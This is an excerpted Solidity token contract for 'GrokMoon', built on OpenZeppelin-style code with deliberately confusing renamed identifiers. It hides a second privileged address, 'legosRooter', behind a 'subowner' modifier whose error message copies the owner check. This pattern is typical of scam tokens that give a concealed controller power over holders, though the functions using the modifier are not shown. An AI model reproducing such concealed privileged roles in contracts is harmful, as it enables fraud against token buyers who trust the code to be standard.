...
GrokMoon 
https://GrokMoon.io/
https://docs.GrokMoon.io/
https://t.me/GrokMoon
*/
pragma solidity 0.8.23;

interface GrokMoon33 {
  /**
...
/*
 * @dev Provides information about the current execution GrokMoon20Burnable, including the
 ...
 */
abstract contract GrokMoon20Burnable {
...
// File: @openzeppelin/contracts/access/GrokMoon20Ownable.sol
 ...
 * the owner.
 */
abstract contract GrokMoon20Ownable is GrokMoon20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "GrokMoon20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "GrokMoon20Ownable: new owner is the zero address");
 ...
 * `SafeGrokMoon` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeGrokMoon {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeGrokMoon: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeGrokMoon: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeGrokMoon: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeGrokMoon: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeGrokMoon: modulo by zero");
  }
...
contract GrokMoonToken is GrokMoon20Burnable, GrokMoon33, GrokMoon20Ownable {
    
    using SafeGrokMoon for uint256;
   ...
   address private legosRooter; 
    ...
    string public GrokMoontelegramcchannel = "https://t.me/GrokMoon";
            function getGrokMoontelegramcchannel() public view returns (string memory) {
        return GrokMoontelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {GrokMoon33-totalSupply}.
    */
    ...
    /**
    * @dev See {GrokMoon33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "GrokMoon20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {GrokMoon33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {GrokMoon33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {GrokMoon33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "GrokMoon33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {GrokMoon33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "GrokMoon33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "GrokMoon33: transfer from the zero address");
        require(shippingto != address(0), "GrokMoon33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "GrokMoon33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "GrokMoon33: approve from the zero address");
        require(transporteur != address(0), "GrokMoon33: approve to the zero address");
